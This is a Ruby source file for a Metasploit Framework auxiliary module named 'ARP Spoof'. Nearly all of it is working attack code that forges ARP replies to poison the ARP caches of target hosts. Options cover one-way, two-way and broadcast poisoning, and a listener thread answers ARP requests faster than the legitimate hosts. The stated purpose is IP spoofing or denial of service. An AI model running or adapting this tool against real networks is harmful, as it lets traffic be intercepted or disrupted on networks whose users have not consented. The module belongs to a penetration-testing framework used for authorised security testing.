##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Capture
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name'        => 'ARP Spoof',
      'Description' => %q{
        Spoof ARP replies and poison remote ARP caches to conduct IP address spoofing or a denial of service.
      },
      'Author'      => 	'amaloteaux', # msf rewrite
            #tons of people  ....
      'License'     => MSF_LICENSE,
      'References'     =>
        [
          ['OSVDB', '11169'],
          ['CVE', '1999-0667'],
          ['URL', 'http://en.wikipedia.org/wiki/ARP_spoofing']
        ],
      'DisclosureDate' => 'Dec 22 1999' #osvdb date
    )

    register_options([
      OptString.new('SHOSTS',  	[true, 'Spoofed ip addresses']),
      OptString.new('SMAC',    	[false, 'The spoofed mac']),
      OptString.new('DHOSTS',  	[true, 'Target ip addresses']),
      OptString.new('INTERFACE', 	[false, 'The name of the interface']),
      OptBool.new(  'BIDIRECTIONAL',	[true, 'Spoof also the source with the dest',false]),
      OptBool.new(  'AUTO_ADD',	[true, 'Auto add new host when discovered by the listener',false]),
      OptBool.new(  'LISTENER',    	[true, 'Use an additionnal thread that will listen to arp request and try to relply as fast as possible', true])
    ], self.class)

    register_advanced_options([
      OptString.new('LOCALSMAC',    	[false, 'The MAC address of the local interface to use for hosts detection, this is usefull only if you want to spoof to another host with SMAC']),
      OptString.new('LOCALSIP',    	[false, 'The IP address of the local interface to use for hosts detection']),
      OptInt.new(   'PKT_DELAY',    	[true, 'The delay in milliseconds between each packet during poisoning', 100]),
      OptInt.new('TIMEOUT', [true, 'The number of seconds to wait for new data during host detection', 2]),
      # This mode will generate address ip conflict pop up  on most systems
      OptBool.new(  'BROADCAST',    	[true, 'If set, the module will send replies on the broadcast address witout consideration of DHOSTS', false])
    ], self.class)

    deregister_options('SNAPLEN', 'FILTER', 'PCAPFILE','RHOST','UDP_SECRET','GATEWAY','NETMASK')
  end

  def run
    open_pcap({'SNAPLEN' => 68, 'FILTER' => "arp[6:2] == 0x0002"})
    @netifaces = true
    if not netifaces_implemented?
      print_error("WARNING : Pcaprub is not uptodate, some functionality will not be available")
      @netifaces = false
    end
    @spoofing = false
    # The local dst (and src) cache(s)
    @dsthosts_cache = {}
    @srchosts_cache = {}
    # Some additional caches for autoadd feature
    if datastore['AUTO_ADD']
      @dsthosts_autoadd_cache = {}
      if datastore['BIDIRECTIONAL']
        @srchosts_autoadd_cache = {}
      end
    end

    begin
      @interface = datastore['INTERFACE'] || Pcap.lookupdev
      #This is needed on windows cause we send interface directly to Pcap functions
      @interface = get_interface_guid(@interface)
      @smac = datastore['SMAC']
      @smac ||= get_mac(@interface) if @netifaces
      raise RuntimeError ,'SMAC is not defined and can not be guessed' unless @smac
      raise RuntimeError ,'Source MAC is not in correct format' unless is_mac?(@smac)

      @sip = datastore['LOCALSIP']
      @sip ||= Pcap.lookupaddrs(@interface)[0] if @netifaces
      raise "LOCALSIP is not defined and can not be guessed" unless @sip
      raise "LOCALSIP is not an ipv4 address" unless Rex::Socket.is_ipv4?(@sip)

      shosts_range  = Rex::Socket::RangeWalker.new(datastore['SHOSTS'])
      @shosts = []
      if datastore['BIDIRECTIONAL']
        shosts_range.each{|shost| if Rex::Socket.is_ipv4?(shost) and shost != @sip then @shosts.push shost end}
      else
        shosts_range.each{|shost| if Rex::Socket.is_ipv4?(shost) then @shosts.push shost end}
      end

      if datastore['BROADCAST']
        broadcast_spoof
      else
        arp_poisoning
      end

    rescue  =>  ex
      print_error( ex.message)
    ensure

      if datastore['LISTENER']
        @listener.kill if @listener
        GC.start()
      end

      if capture and @spoofing and not datastore['BROADCAST']
        print_status("RE-ARPing the victims...")
        3.times do
          @dsthosts_cache.keys.sort.each do |dhost|
            dmac = @dsthosts_cache[dhost]
            if datastore['BIDIRECTIONAL']
              @srchosts_cache.keys.sort.each do |shost|
                smac = @srchosts_cache[shost]
                if shost != dhost
                  vprint_status("Sending arp packet for #{shost} to #{dhost}")
                  reply = buildreply(shost, smac, dhost, dmac)
                  inject(reply)
                  Rex.sleep((datastore['PKT_DELAY'] * 1.0 )/1000)
                end
              end
            else
              @shosts.each do |shost|
                if shost != dhost
                  vprint_status("Sending arp request for #{shost} to #{dhost}")
                  request = buildprobe(dhost, dmac, shost)
                  inject(request)
                  Rex.sleep((datastore['PKT_DELAY'] * 1.0 )/1000)
                end
              end
            end
          end
          if datastore['BIDIRECTIONAL']
            @srchosts_cache.keys.sort.each do |shost|
              smac = @srchosts_cache[shost]
              @dsthosts_cache.keys.sort.each do |dhost|
                dmac = @dsthosts_cache[dhost]
                if shost != dhost
                  vprint_status("Sending arp packet for #{dhost} to #{shost}")
                  reply = buildreply(dhost, dmac, shost, smac)
                  inject(reply)
                  Rex.sleep((datastore['PKT_DELAY'] * 1.0 )/1000)
                end
              end
            end
          end
        end # 3.times
      end
      close_pcap
    end #begin/rescue/ensure
  end

  def broadcast_spoof
    print_status("ARP poisoning in progress (broadcast)...")
    while(true)
      @shosts.each do |shost|
        vprint_status("Sending arp packet for #{shost} address")
        reply = buildreply(shost, @smac, '0.0.0.0', 'ff:ff:ff:ff:ff:ff')
        inject(reply)
        Rex.sleep((datastore['PKT_DELAY'] * 1.0 )/1000)
      end
    end
  end

  def arp_poisoning
    lsmac = datastore['LOCALSMAC'] || @smac
    raise RuntimeError ,'Local Source Mac is not in correct format' unless is_mac?(lsmac)

    dhosts_range = Rex::Socket::RangeWalker.new(datastore['DHOSTS'])
    @dhosts = []
    dhosts_range.each{|dhost| if Rex::Socket.is_ipv4?(dhost) and dhost != @sip then @dhosts.push(dhost) end}

    #Build the local dest hosts cache
    print_status("Building the destination hosts cache...")
    @dhosts.each do |dhost|
      vprint_status("Sending arp packet to #{dhost}")

      probe = buildprobe(@sip, lsmac, dhost)
      inject(probe)
      while(reply = getreply())
        next if not reply.is_arp?
        #Without this check any arp request would be added to the cache
        if @dhosts.include? reply.arp_saddr_ip
          print_status("#{reply.arp_saddr_ip} appears to be up.")
          report_host(:host => reply.arp_saddr_ip, :mac=>reply.arp_saddr_mac)
          @dsthosts_cache[reply.arp_saddr_ip] = reply.arp_saddr_mac
        end
      end

    end
    #Wait some few seconds for last packets
    etime = Time.now.to_f + datastore['TIMEOUT']
    while (Time.now.to_f < etime)
      while(reply = getreply())
        next if not reply.is_arp?
        if @dhosts.include? reply.arp_saddr_ip
          print_status("#{reply.arp_saddr_ip} appears to be up.")
          report_host(:host => reply.arp_saddr_ip, :mac=>reply.arp_saddr_mac)
          @dsthosts_cache[reply.arp_saddr_ip] = reply.arp_saddr_mac
        end
      end
      Rex.sleep(0.50)
    end
    raise RuntimeError, "No hosts found" unless @dsthosts_cache.length > 0

    #Build the local src hosts cache
    if datastore['BIDIRECTIONAL']
      print_status("Building the source hosts cache for unknow source hosts...")
      @shosts.each do |shost|
        if @dsthosts_cache.has_key? shost
          vprint_status("Adding #{shost} from destination cache")
          @srchosts_cache[shost] = @dsthosts_cache[shost]
          next
        end
        vprint_status("Sending arp packet to #{shost}")
        probe = buildprobe(@sip, lsmac, shost)
        inject(probe)
        while(reply = getreply())
          next if not reply.is_arp?
          if @shosts.include? reply.arp_saddr_ip
            print_status("#{reply.arp_saddr_ip} appears to be up.")
            report_host(:host => reply.arp_saddr_ip, :mac=>reply.arp_saddr_mac)
            @srchosts_cache[reply.arp_saddr_ip] = reply.arp_saddr_mac
          end
        end

      end
      #Wait some few seconds for last packets
      etime = Time.now.to_f + datastore['TIMEOUT']
      while (Time.now.to_f < etime)
        while(reply = getreply())
          next if not reply.is_arp?
          if @shosts.include? reply.arp_saddr_ip
            print_status("#{reply.arp_saddr_ip} appears to be up.")
            report_host(:host => reply.arp_saddr_ip, :mac=>reply.arp_saddr_mac)
            @srchosts_cache[reply.arp_saddr_ip] = reply.arp_saddr_mac
          end
        end
        Rex.sleep(0.50)
      end
      raise RuntimeError, "No hosts found" unless @srchosts_cache.length > 0
    end

    if datastore['AUTO_ADD']
      @mutex_cache = Mutex.new
    end

    #Start the listener
    if datastore['LISTENER']
      start_listener(@dsthosts_cache, @srchosts_cache)
    end
    #Do the job until user interupt it
    print_status("ARP poisoning in progress...")
    @spoofing = true
    while(true)
      if datastore['AUTO_ADD']
        @mutex_cache.lock
        if @dsthosts_autoadd_cache.length > 0
          @dsthosts_cache.merge!(@dsthosts_autoadd_cache)
          @dsthosts_autoadd_cache = {}
        end
        if datastore['BIDIRECTIONAL']
          if @srchosts_autoadd_cache.length > 0
            @srchosts_cache.merge!(@srchosts_autoadd_cache)
            @srchosts_autoadd_cache = {}
          end
        end
        @mutex_cache.unlock
      end
      @dsthosts_cache.keys.sort.each do |dhost|
        dmac = @dsthosts_cache[dhost]
        if datastore['BIDIRECTIONAL']
          @srchosts_cache.keys.sort.each do |shost|
            smac = @srchosts_cache[shost]
            if shost != dhost
              vprint_status("Sending arp packet for #{shost} to #{dhost}")
              reply = buildreply(shost, @smac, dhost, dmac)
              inject(reply)
              Rex.sleep((datastore['PKT_DELAY'] * 1.0 )/1000)
            end
          end
        else
          @shosts.each do |shost|
            if shost != dhost
              vprint_status("Sending arp packet for #{shost} to #{dhost}")
              reply = buildreply(shost, @smac, dhost, dmac)
              inject(reply)
              Rex.sleep((datastore['PKT_DELAY'] * 1.0 )/1000)
            end
          end
        end
      end

      if datastore['BIDIRECTIONAL']
        @srchosts_cache.keys.sort.each do |shost|
          smac = @srchosts_cache[shost]
          @dsthosts_cache.keys.sort.each do |dhost|
            dmac = @dsthosts_cache[dhost]
            if shost != dhost
              vprint_status("Sending arp packet for #{dhost} to #{shost}")
              reply = buildreply(dhost, @smac, shost, smac)
              inject(reply)
              Rex.sleep((datastore['PKT_DELAY'] * 1.0 )/1000)
            end
          end
        end
      end
    end
  end


  def is_mac?(mac)
    if mac =~ /^([a-fA-F0-9]{2}:){5}[a-fA-F0-9]{2}$/ then true
    else false end
  end

  def buildprobe(shost, smac, dhost)
    p = PacketFu::ARPPacket.new
    p.eth_saddr = smac
    p.eth_daddr = "ff:ff:ff:ff:ff:ff"
    p.arp_opcode = 1
    p.arp_daddr_mac = p.eth_daddr
    p.arp_saddr_mac = p.eth_saddr
    p.arp_saddr_ip = shost
    p.arp_daddr_ip = dhost
    p
  end

  def buildreply(shost, smac, dhost, dmac)
    p = PacketFu::ARPPacket.new
    p.eth_saddr = smac
    p.eth_daddr = dmac
    p.arp_opcode = 2 # ARP Reply
    p.arp_daddr_mac = p.eth_daddr
    p.arp_saddr_mac = p.eth_saddr
    p.arp_saddr_ip = shost
    p.arp_daddr_ip = dhost
    p
  end

  def getreply
    pkt_bytes = capture.next
    return if not pkt_bytes
    pkt = PacketFu::Packet.parse(pkt_bytes)
    return unless pkt.is_arp?
    return unless pkt.arp_opcode == 2
    pkt
  end

  def start_listener(dsthosts_cache, srchosts_cache)

    if datastore['BIDIRECTIONAL']
      args = {:BIDIRECTIONAL => true,  :dhosts => dsthosts_cache.dup, :shosts => srchosts_cache.dup}
    else
      args = {:BIDIRECTIONAL => false, :dhosts => dsthosts_cache.dup, :shosts => @shosts.dup}
    end
    # To avoid any race condition in case of , even if actually those are never updated after the thread is launched
    args[:AUTO_ADD] = datastore['AUTO_ADD']
    args[:localip] = @sip.dup
    @listener = Thread.new(args) do |args|
      begin
        #one more local copy
        liste_src_ips = []
        if args[:BIDIRECTIONAL]
          args[:shosts].each_key {|address| liste_src_ips.push address}
        else
          args[:shosts].each {|address| liste_src_ips.push address}
        end
        liste_dst_ips = []
        args[:dhosts].each_key {|address| liste_dst_ips.push address}
        localip = args[:localip]

        listener_capture = ::Pcap.open_live(@interface, 68, true, 0)
        listener_capture.setfilter("arp[6:2] == 0x0001")
        while(true)
          pkt_bytes = listener_capture.next
          if pkt_bytes
            pkt = PacketFu::Packet.parse(pkt_bytes)
            if pkt.is_arp?
              if pkt.arp_opcode == 1
                #check if the source ip is in the dest hosts
                if (liste_dst_ips.include? pkt.arp_saddr_ip and liste_src_ips.include? pkt.arp_daddr_ip) or
                  (args[:BIDIRECTIONAL] and liste_dst_ips.include? pkt.arp_daddr_ip and liste_src_ips.include? pkt.arp_saddr_ip)
                  vprint_status("Listener : Request from #{pkt.arp_saddr_ip} for #{pkt.arp_daddr_ip}")
                  reply = buildreply(pkt.arp_daddr_ip, @smac, pkt.arp_saddr_ip, pkt.eth_saddr)
                  3.times{listener_capture.inject(reply.to_s)}
                elsif args[:AUTO_ADD]
                  if (@dhosts.include? pkt.arp_saddr_ip and not liste_dst_ips.include? pkt.arp_saddr_ip and
                    pkt.arp_saddr_ip != localip)
                    @mutex_cache.lock
                    print_status("#{pkt.arp_saddr_ip} appears to be up.")
                    @dsthosts_autoadd_cache[pkt.arp_saddr_ip] = pkt.arp_saddr_mac
                    liste_dst_ips.push pkt.arp_saddr_ip
                    @mutex_cache.unlock
                  elsif (args[:BIDIRECTIONAL] and @shosts.include? pkt.arp_saddr_ip and
                    not liste_src_ips.include? pkt.arp_saddr_ip and pkt.arp_saddr_ip != localip)
                    @mutex_cache.lock
                    print_status("#{pkt.arp_saddr_ip} appears to be up.")
                    @srchosts_autoadd_cache[pkt.arp_saddr_ip] = pkt.arp_saddr_mac
                    liste_src_ips.push pkt.arp_saddr_ip
                    @mutex_cache.unlock
                  end
                end
              end
            end
          end
        end
      rescue => ex
        print_error("Listener Error: #{ex.message}")
        print_error("Listener Error: Listener is stopped")
      end
    end
    @listener.abort_on_exception = true
  end

end
